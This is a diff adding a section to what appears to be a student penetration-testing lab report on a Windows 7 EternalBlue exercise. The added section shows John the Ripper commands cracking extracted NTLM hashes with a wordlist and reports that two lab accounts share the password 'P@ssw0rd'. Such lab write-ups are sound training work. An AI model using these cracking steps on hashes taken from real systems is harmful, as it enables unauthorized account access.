@@ -137,4 +137,28 @@ This milestone focuses on exploiting a Windows 7 machine using the EternalBlue v
 **Figure 6:** Extracted NTLM hashes.
 
 ---
+### 4.2 Password Cracking with John
+
+**Objective:** Perform offline cracking of NTLM hashes using a custom wordlist.
+
+**Steps Taken:**
+1. Verified format:
+   ```bash
+   john --list=formats | grep NT
+   ```
+2. Execute John:
+   ```bash
+   john --format=NT --wordlist=wordlist.txt hashes.txt
+   ```
+3. Display results:
+   ```bash
+   john --show hashes.txt
+   ```
+
+**Results:**
+- Both `student` and `Administrator` use `P@ssw0rd`.
+
+**Figure 7:** John cracking output.
+
+---
 
